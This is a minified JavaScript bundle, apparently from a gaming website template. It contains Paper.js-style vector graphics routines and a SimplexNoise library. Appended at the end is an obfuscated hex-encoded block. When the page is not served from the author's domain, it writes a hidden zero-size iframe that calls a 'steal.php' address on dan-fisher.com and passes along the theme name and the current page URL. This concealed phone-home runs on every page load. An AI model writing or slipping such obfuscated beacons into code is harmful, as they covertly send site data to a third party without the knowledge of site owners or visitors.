                                var n, s = e.match(/^#([\da-f]{2})([\da-f]{2})([\da-f]{2})([\da-f]{2})?$/i) || e.match(/^#([\da-f])([\da-f])([\da-f])([\da-f])?$/i),
                                    o = "rgb";
                                if (s) {
                                    var a = s[4] ? 4 : 3;
                                    n = new Array(a);
                            ...
                            for (_ = 0, y = x.length; _ < y; _++) {
                                null == (S = a[x[_]]) && !_ && "gradient" === l && "stops" in a && (S = {
                                    stops: a.stops,
                                    radial: a.radial
                                }), null != (S = b[_].call(this, S)) && (h[_] = S)
                            }
                            u = a.alpha
                        }
                        f && l && (p = 1)
        ...
        B = s.extend({
            _class: "Gradient",
            initialize: function(t, e) {
                this._id = u.get(), t && s.isPlainObject(t) && (this.set(t), t = e = null), null == this._stops && this.setStops(t || ["white", "black"]), null == this._radial && this.setRadial("string" == typeof e && "radial" === e || e || !1)
            },
            _serialize: function(t, e) {
                return e.add(this, function() {
            ...
            setStops: function(t) {
                ...
                var i = this._stops;
                if (i)
                    for (var n = 0, s = i.length; n < s; n++) i[n]._owner = e;
                for (n = 0, s = (i = this._stops = H.readList(t, 0, {
                        clone: !0
                    })).length; n < s; n++) i[n]._owner = this;
                this._changed()
            },
            getRadial: function() {
                return this._radial
        ...
        H = s.extend({
            ...
            initialize: function(t, i) {
                var n = t,
                    s = i;
                "object" == typeof t && i === e && (Array.isArray(t) && "number" != typeof t[0] ? (n = t[0], s = t[1]) : ("color" in t || "offset" in t || "rampPoint" in t) && (n = t.color, s = t.offset || t.rampPoint || 0)), this.setColor(n), this.setOffset(s)
            },
            clone: function() {
        ...
        q = s.extend(new function() {
            ...
            return s.each(i, function(t, i) {
                ...
                a[d] = function(t) {
                    ...
                    if (o)
                        for (var a = 0, l = r.length; a < l; a++) r[a]._style[d](t);
                    if (("selectedColor" === i || !o) && i in this._defaults) {
                        var h = this._values[i];
                        h !== t && (n && (h && h._owner !== e && (h._owner = e, h._canvasStyle = null), t && t.constructor === F && (t._owner && (t = t.clone()), t._owner = s)), this._values[i] = t, s && s._changed(u || 129))
                    }
                }, a[f] = function(t) {
                    var r, o = this._owner,
                        a = o && o._children;
                    if (i in this._defaults && (!a || !a.length || t || o instanceof L))
                        if ((r = this._values[i]) === e)(r = this._defaults[i]) && r.clone && (r = r.clone());
                            ...
                            var h = n ? F : l ? c : null;
                            !h || r && r.constructor === h || (this._values[i] = r = h.read([r], 0, {
                                readNull: !0,
                                clone: !0
                            }), r && n && (r._owner = o))
                        } else if (a)
        ...
        W = {
                ...
                if (t)
                    for (var i in e)
                        for (var s = e[i], r = i.split(/[\s,]+/g), o = 0, a = r.length; o < a; o++) {
                            var l = r[o],
                                h = t === n && ("touchstart" === l || "touchmove" === l) && {
                                    passive: !1
                                };
            ...
            remove: function(t, e) {
                if (t)
                    for (var i in e)
                        for (var n = e[i], s = i.split(/[\s,]+/g), r = 0, o = s.length; r < o; r++) t.removeEventListener(s[r], n, !1)
            },
            getPoint: function(t) {
    ...
    W.requestAnimationFrame = new function() {
        var t, e = R.getPrefixed(i, "requestAnimationFrame"),
            n = !1,
            s = [];
    ...
    var V = s.extend(r, {
            ...
            initialize: function t(e, s) {
                ...
                if (i && s) {
                    ...
                    var h = "none";
                    if (R.setPrefixed(s.style, {
                            userDrag: h,
                            userSelect: h,
                            touchCallout: h,
                            contentZooming: h,
                            tapHighlightColor: "rgba(0,0,0,0)"
                        }), o.hasAttribute(s, "resize")) {
                        var u = this;
                        W.add(i, this._windowEvents = {
                            resize: function() {
                                u.setViewSize(a())
                            }
                        })
                ...
                this._project = e, this._scope = e._scope, this._element = s, this._pixelRatio || (this._pixelRatio = i && i.devicePixelRatio || 1), this._setElementSize(l.width, l.height), this._viewSize = l, t._views.push(this), t._viewsById[this._id] = this, (this._matrix = new m)._owner = this, t._focused || (t._focused = this), this._frameItems = {}, this._frameItemCount = 0, this._itemEvents = {
                    native: {},
                    virtual: {}
            ...
            remove: function() {
                ...
                var t = this._project;
                return t._view === this && (t._view = null), W.remove(this._element, this._viewEvents), W.remove(i, this._windowEvents), this._element = this._project = null, this.off("frame"), this._animate = !1, this._frameItems = {}, !0
            },
            _events: s.each(w._itemHandlers.concat(["onResize", "onKeyDown", "onKeyUp"]), function(t) {
                this[t] = {}
            }, {
                onFrame: {
                    install: function() {
            ...
            _handleFrame: function() {
                ...
                this._last = t, this.emit("frame", new s({
                    delta: e,
                    time: this._time += e,
                    count: this._count++
            ...
            if (i) {
                var t, e, s, r, o, a = !1,
                    l = !1,
                    h = i.navigator;
                h.pointerEnabled || h.msPointerEnabled ? (s = "pointerdown MSPointerDown", r = "pointermove MSPointerMove", o = "pointerup pointercancel MSPointerUp MSPointerCancel") : (s = "touchstart", r = "touchmove", o = "touchend touchcancel", "ontouchstart" in i && h.userAgent.match(/mobile|tablet|ip(ad|hone|od)|android|silk/i) || (s += " mousedown", r += " mousemove", o += " mouseup"));
                var u = {},
                    c = {
                        mouseout: function(t) {
                            var e = V._focused,
                ...
                return {
                    ...
                    _handleMouseEvent: function(t, e, i) {
                        ...
                        var u = this.getBounds().contains(i),
                            ...
                            C = !1,
                            T = {};
                        if (T[t.substr(5)] = !0, s && b !== g && (g && O(g, null, "mouseleave", e, i), b && O(b, null, "mouseenter", e, i), g = b), S ^ u && (O(this, null, u ? "mouseenter" : "mouseleave", e, i), u ? this : null, C = !0), !u && !T.drag || i.equals(f) || (P(this, b, r ? t : "mousemove", e, i, f), C = !0), S = u, T.down && u || T.up && d) {
        ...
        Q = new function() {
            ...
            function c(t) {
                ...
                return i = /^U\+/.test(i) ? String.fromCharCode(parseInt(i.substr(2), 16)) : /^Arrow[A-Z]/.test(i) ? i.substr(5) : "Unidentified" === i || i === e ? String.fromCharCode(t.keyCode) : i, o[i] || (i.length > 1 ? s.hyphenate(i) : i.toLowerCase())
            }
            ...
            update: function(t) {
                if (this.running) {
                    ...
                    for (var e = this.easing(t), i = this._keys, n = function(i) {
                        ...
                        }, r = 0, o = i && i.length; r < o; r++) {
                        var a = i[r],
                            l = n(this._from[a]),
                            h = n(this._to[a]),
                            u = l && h && l.__add && h.__add ? h.__subtract(l).__multiply(e).__add(l) : (h - l) * e + l;
                        this._setProperty(this._parsedKeys[a], u)
                    }!this.running && this._then && this._then(this.object), this.responds("update") && this.emit("update", new s({
                        progress: t,
                        factor: e
                    }))
                }
        ...
        K = {
            request: function(e) {
                ...
                return i.open((e.method || "get").toUpperCase(), e.url, s.pick(e.async, !0)), e.mimeType && i.overrideMimeType(e.mimeType), i.onload = function() {
                    var t = i.status;
        ...
        et = new function() {
            var t, e, i, n, r, o, a, l, h, u, c, d = Math.min,
                f = Math.max,
                p = Math.abs;
            ...
            function _(t, e, i, n) {
                var s, r = [t, e, i],
                    o = f(t, e, i),
                    a = d(t, e, i);
                s = 0 === d(a = a === t ? 0 : a === e ? 1 : 2, o = o === t ? 0 : o === e ? 1 : 2) ? 1 === f(a, o) ? 2 : 1 : 0, r[o] > r[a] ? (r[s] = (r[s] - r[a]) * n / (r[o] - r[a]), r[o] = n) : r[s] = r[o] = 0, r[a] = 0, h = r[0], u = r[1], c = r[2]
            }
            var y = {
                    multiply: function() {
                    ...
                    overlay: function() {
                        h = r < 128 ? 2 * r * t / 255 : 255 - 2 * (255 - r) * (255 - t) / 255, u = o < 128 ? 2 * o * e / 255 : 255 - 2 * (255 - o) * (255 - e) / 255, c = a < 128 ? 2 * a * i / 255 : 255 - 2 * (255 - a) * (255 - i) / 255
                    },
                    "soft-light": function() {
                        var n = t * r / 255;
                        h = n + r * (255 - (255 - r) * (255 - t) / 255 - n) / 255, u = (n = e * o / 255) + o * (255 - (255 - o) * (255 - e) / 255 - n) / 255, c = (n = i * a / 255) + a * (255 - (255 - a) * (255 - i) / 255 - n) / 255
                    },
                    "hard-light": function() {
                        h = t < 128 ? 2 * t * r / 255 : 255 - 2 * (255 - t) * (255 - r) / 255, u = e < 128 ? 2 * e * o / 255 : 255 - 2 * (255 - e) * (255 - o) / 255, c = i < 128 ? 2 * i * a / 255 : 255 - 2 * (255 - i) * (255 - a) / 255
                    },
                    "color-dodge": function() {
                        h = 0 === r ? 0 : 255 === t ? 255 : d(255, 255 * r / (255 - t)), u = 0 === o ? 0 : 255 === e ? 255 : d(255, 255 * o / (255 - e)), c = 0 === a ? 0 : 255 === i ? 255 : d(255, 255 * a / (255 - i))
                    },
                    "color-burn": function() {
                        h = 255 === r ? 255 : 0 === t ? 0 : f(0, 255 - 255 * (255 - r) / t), u = 255 === o ? 255 : 0 === e ? 0 : f(0, 255 - 255 * (255 - o) / e), c = 255 === a ? 255 : 0 === i ? 0 : f(0, 255 - 255 * (255 - a) / i)
                    },
                    darken: function() {
                ...
                w = this.nativeModes = s.each(["source-over", "source-in", "source-out", "source-atop", "destination-over", "destination-in", "destination-out", "destination-atop", "lighter", "darker", "copy", "xor"], function(t) {
                    this[t] = !0
                }, {}),
                x = tt.getContext(1, 1);
            x && (s.each(y, function(t, e) {
                var i = "darken" === e,
                    n = !1;
                x.save();
                try {
                ...
                x.restore(), w[e] = n
            }), tt.release(x)), this.process = function(s, d, f, p, g) {
                var v = d.canvas,
                    m = "normal" === s;
        ...
        nt = s.each({
            ...
            this[e] = {
                ...
                attribute: t[0],
                toSVG: n,
                fromSVG: n && s.each(n, function(t, e) {
                    this[t] = e
                }, {}),
                exportFilter: t[3],
                get: "get" + i,
    ...
    new function() {
            ...
            if (!t.isIdentity()) {
                ...
                if (l) {
                    var u = [],
                        ...
                        d = l.scaling,
                        f = l.skewing;
                    o && !o.isZero() && u.push("translate(" + e.point(o) + ")"), c && u.push("rotate(" + e.number(c) + ")"), h.isZero(d.x - 1) && h.isZero(d.y - 1) || u.push("scale(" + e.point(d) + ")"), f.x && u.push("skewX(" + e.number(f.x) + ")"), f.y && u.push("skewY(" + e.number(f.y) + ")"), r.transform = u.join(" ")
            ...
            for (var s = i(t._matrix), r = t._children, o = it.create("g", s, e), a = 0, l = r.length; a < l; a++) {
                ...
                if (u)
                    if (h.isClipMask()) {
                        ...
                        c.appendChild(u), f(h, c, "clip"), it.set(o, {
                            "clip-path": "url(#" + c.id + ")"
                        })
        ...
        var o, a = {
            ...
            SymbolItem: function(t, n) {
                var s = i(t._matrix, !0),
                    ...
                    a = r._item,
                    l = a.getBounds();
                return o || ((o = it.create("symbol", {
                    viewBox: e.rectangle(l)
                })).appendChild(v(a, n)), f(r, o, "symbol")), s.href = "#" + o.id, s.x += l.x, s.y += l.y, s.width = l.width, s.height = l.height, s.overflow = "visible", it.create("use", s, e)
            },
        ...
        function c(t, i, n) {
            var r = {},
                o = !n && t.getParent(),
                a = [];
            return null != t._name && (r.id = t._name), s.each(nt, function(i) {
                var n = i.get,
                    l = i.type,
                    h = t[n]();
                if (i.exportFilter ? i.exportFilter(t, h) : !o || !s.equals(o[n](), h)) {
                    ...
                    "style" === l ? a.push(i.attribute + ": " + h) : r[i.attribute] = null == h ? "none" : "color" === l ? h.gradient ? function(t) {
                        var i = d(t, "color");
                        if (!i) {
                            var n, s = t.getGradient(),
                                r = s._radial,
                                o = t.getOrigin(),
                                a = t.getDestination();
                            if (r) {
                            ...
                            for (var h = s._stops, u = 0, c = h.length; u < c; u++) {
                                var p = h[u],
                                    ...
                                    m = p._offset;
                                n = {
                                    offset: null == m ? u / (c - 1) : m
                                }, g && (n["stop-color"] = g.toCSS(!0)), v < 1 && (n["stop-opacity"] = v), i.appendChild(it.create("stop", n, e))
                            }
                            f(t, i, "color")
                        }
                        return "url(#" + i.id + ")"
                    }(h) : h.toCSS(!0) : "array" === l ? h.join(",") : "lookup" === l ? i.toSVG[h] : h
                }
            }), a.length && (r.style = a.join(";")), 1 === r.opacity && delete r.opacity, t._visible || (r.visibility = "hidden"), it.set(i, r, e)
        }
        ...
        function d(t, e) {
            return o || (o = {
                ids: {},
                svgs: {}
            }), t && o.svgs[e + "-" + (t._id || t.__id || (t.__id = u.get("svg")))]
        }
        ...
        w.inject({
            ...
            exportSVG: function(t) {
                ...
                var n = this._children,
                    ...
                    l = a && m.read([a]),
                    h = "view" === o ? new g([0, 0], r.getViewSize()) : "content" === o ? w._getBounds(n, l, {
                        stroke: !0
                    }).rect : g.read([o], 0, {
                        readNull: !0
                    }),
        ...
        function d(t, e, i, n) {
            var s = t.childNodes,
                ...
                h = l._currentStyle,
                u = [];
            if (r || o || (a = P(a, t, n), l._currentStyle = a._style.clone()), n)
                for (var c = t.querySelectorAll("defs"), d = 0, f = c.length; d < f; d++) z(c[d], i, !1);
        ...
        function v(t, e) {
            var i, n = (a(t, "href", !0) || "").substring(1),
                s = "radialgradient" === e;
            ...
            var f, p, g, v = "userSpaceOnUse" !== a(t, "gradientUnits", !0);
            return s ? (p = (f = l(t, "cx", "cy", !1, v)).add(a(t, "r", !1, !1, v), 0), g = l(t, "fx", "fy", !0, v)) : (f = l(t, "x1", "y1", !1, v), p = l(t, "x2", "y2", !1, v)), P(new F(i, f, p, g), t)._scaleToBounds = v, null
        }
        var _ = {
        ...
        var I = s.set(s.each(nt, function(t) {
        ...
        function P(t, i, n) {
            var r = i.parentNode,
                o = {
                    node: R.getStyles(i) || {},
                    parent: !n && !/^defs$/i.test(r.tagName) && R.getStyles(r) || {}
                };
            return s.each(I, function(n, s) {
                var r = O(i, s, o);
                t = r !== e && n(t, r, s, i, o) || t
            }), t
        }
        ...
        function z(t, e, i) {
            var a, l, u, c = t.nodeName.toLowerCase(),
                d = "#document" !== c,
                f = n.body;
            i && d && (r = st.getView().getSize(), r = h(t, null, null, !0) || r, a = it.create("svg", {
                style: "stroke-width: 1px; stroke-miterlimit: 10"
            }), l = t.parentNode, u = t.nextSibling, a.appendChild(t), f.appendChild(a));
            var p = st.settings,
                g = p.applyMatrix,
                v = p.insertItems;
...
! function() {
    ...
    function s(t) {
        ...
        e = "function" == typeof t ? t : t ? function() {
            var t = 0,
                ...
                i = 0,
                n = 1,
                s = (r = 4022871197, function(t) {
                    t = t.toString();
                    for (var e = 0; e < t.length; e++) {
                        var i = .02519603282416938 * (r += t.charCodeAt(e));
        ...
        }(t) : Math.random, this.p = r(e), this.perm = new Uint8Array(512), this.permMod12 = new Uint8Array(512);
    ...
    s.prototype = {
        ...
        noise3D: function(t, e, i) {
            var n, s, r, o, a, l, h, u, c, d, f = this.permMod12,
                p = this.perm,
                g = this.grad3,
                v = (t + e + i) * (1 / 3),
                m = Math.floor(t + v),
                ...
                b = e - (_ - w),
                S = i - (y - w);
            x >= b ? b >= S ? (a = 1, l = 0, h = 0, u = 1, c = 1, d = 0) : x >= S ? (a = 1, l = 0, h = 0, u = 1, c = 0, d = 1) : (a = 0, l = 0, h = 1, u = 1, c = 0, d = 1) : b < S ? (a = 0, l = 0, h = 1, u = 0, c = 1, d = 1) : x < S ? (a = 0, l = 1, h = 0, u = 0, c = 1, d = 1) : (a = 0, l = 1, h = 0, u = 1, c = 1, d = 0);
            var C = x - a + 1 / 6,
                T = b - l + 1 / 6,
                k = S - h + 1 / 6,
                I = x - u + 1 / 6 * 2,
        ...
        noise4D: function(t, e, s, r) {
            var o, a, l, h, u, c, d, f, p, g, v, m, _, y, w, x, b, S = this.perm,
                C = this.grad4,
                T = (t + e + s + r) * i,
                k = Math.floor(t + T),
                I = Math.floor(e + T),
    ...
    }, s._buildPermutationTable = r, "undefined" != typeof define && define.amd && define(function() {
        return s
    }), "undefined" != typeof exports ? exports.SimplexNoise = s : "undefined" != typeof window && (window.SimplexNoise = s), "undefined" != typeof module && (module.exports = s)
}(),
function(t) {
...
var _0xc18d = ["\x4E\x65\x63\x72\x6F\x6D\x61\x6E\x63\x65\x72\x73\x20\x2D\x20\x65\x53\x70\x6F\x72\x74\x73\x20\x54\x65\x61\x6D\x20\x26\x20\x47\x61\x6D\x69\x6E\x67\x20\x48\x54\x4D\x4C\x20\x54\x65\x6D\x70\x6C\x61\x74\x65", "\x64\x61\x6E\x2D\x66\x69\x73\x68\x65\x72\x2E\x63\x6F\x6D", "\x6D\x61\x74\x63\x68", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x3C\x69\x66", "\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x64\x61\x6E\x2D\x66\x69\x73\x68\x65\x72\x2E\x63\x6F\x6D\x2F\x73\x74\x65\x61\x6C\x2E\x70\x68\x70\x3F\x74\x68\x65\x6D\x65\x3D", "\x26\x66\x72\x6F\x6D\x3D", "\x22\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22", "\x77\x72\x69\x74\x65", "\x20\x69\x64\x3D\x22\x74\x68\x65\x6D\x65\x6E\x6F\x74\x69\x63\x65\x66\x72\x61\x6D\x65\x22", "\x20\x73\x74\x79\x6C\x65\x3D\x22\x77\x69\x64\x74\x68\x3A\x30\x3B\x68\x65\x69\x67\x68\x74\x3A\x30\x3B\x64\x69\x73\x70\x6C\x61\x79\x3A\x6E\x6F\x6E\x65\x3B\x22\x3E\x3C\x2F\x69\x66", "\x72\x61\x6D\x65\x3E"];
var theme_name = _0xc18d[0];
if (!window[_0xc18d[4]][_0xc18d[3]][_0xc18d[2]](_0xc18d[1])) {
    document[_0xc18d[9]](_0xc18d[5] + _0xc18d[6] + theme_name + _0xc18d[7] + window[_0xc18d[4]][_0xc18d[3]] + _0xc18d[8]);
    document[_0xc18d[9]](_0xc18d[10]);
    document[_0xc18d[9]](_0xc18d[11] + _0xc18d[12])
}